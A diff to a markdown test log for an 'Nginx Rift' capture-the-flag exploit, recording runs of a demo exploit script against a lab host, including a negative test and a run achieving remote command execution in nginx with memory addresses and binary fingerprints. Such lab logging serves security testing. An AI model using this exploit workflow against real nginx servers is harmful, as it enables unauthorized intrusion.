@@ -1,6 +1,6 @@
 # Nginx Rift CTF Tests
 
-Last updated: 2026-05-15 05:17:45 CEST
+Last updated: 2026-05-15 05:32:17 CEST
 
 ## Baseline: Original PoC Command Execution
 
@@ -607,3 +607,90 @@ run artifact: artifacts/demo_v1_5_20260515-051730.json
 ```
 
 Status: pass. The first round won, so round 2 was not needed.
+
+## Demo Runner v1.6 Negative Path
+
+Purpose: prove expected-failure handling records a clean negative pass when a deliberately bad final candidate is sent.
+
+Command:
+
+```bash
+./demo_ctf_exploit_v1_6.py \
+  --host 192.168.1.205 --port 19321 \
+  --fast --no-color --require-reset-core \
+  --negative-test bad-candidate --negative-test-only --expected-fail \
+  --no-binary-fingerprint --artifact-dir artifacts
+```
+
+Observed:
+
+```text
+reset core PID matches expected worker 2850
+reset core nonce found: 1010 URI-safe / 10437 slots
+candidate sanity kept: 160
+candidate sanity dropped: 6
+negative candidate produced no marker proof
+run artifact: artifacts/demo_v1_6_20260515-053017.json
+```
+
+Status: pass, recorded as `negative_pass`.
+
+## Demo Runner v1.6 Command Execution And Fingerprinting
+
+Purpose: run an arbitrary command through the hardened proof-command builder, capture output, fingerprint remote binaries, and verify delayed cleanup.
+
+Command:
+
+```bash
+./demo_ctf_exploit_v1_6.py \
+  --host 192.168.1.205 --port 19321 \
+  --fast --no-color --require-reset-core --rounds 2 \
+  --exec-cmd id --cleanup-delay 30 --cleanup-core \
+  --artifact-dir artifacts
+```
+
+Observed:
+
+```text
+nginx sha256: 14bebe8937678598...
+nginx build-id: 060e053ab1fa1a2876b7fe0ff4eff0cc777857b6
+libc sha256: c53819710b163d3f...
+libc build-id: 095c7ba148aeca81668091f718047078d57efddb
+reset core PID matches expected worker 2913
+reset core nonce found: 1028 URI-safe / 10437 slots
+candidate sanity kept: 195
+candidate sanity dropped: 29
+winning address: 0x55a491955627
+winning body offset: 80
+command output: uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
+run artifact: artifacts/demo_v1_6_20260515-053037.json
+```
+
+Cleanup check after the configured delay:
+
+```text
+marker=/tmp/nginx_rift_demo_v1_6_246468e701a7 http=404
+core http=404
+```
+
+Status: pass.
+
+## Demo Artifact Summarizer
+
+Purpose: summarize multiple demo artifacts and surface success/negative-pass status, reset-core PID matches, candidate counts, winning addresses, and command modes.
+
+Command:
+
+```bash
+./summarize_demo_artifacts.py \
+  artifacts/demo_v1_6_20260515-053017.json \
+  artifacts/demo_v1_6_20260515-053037.json
+```
+
+Observed:
+
+```text
+artifacts=2 success=1 negative_pass=1 failed_or_other=0
+```
+
+Status: pass.
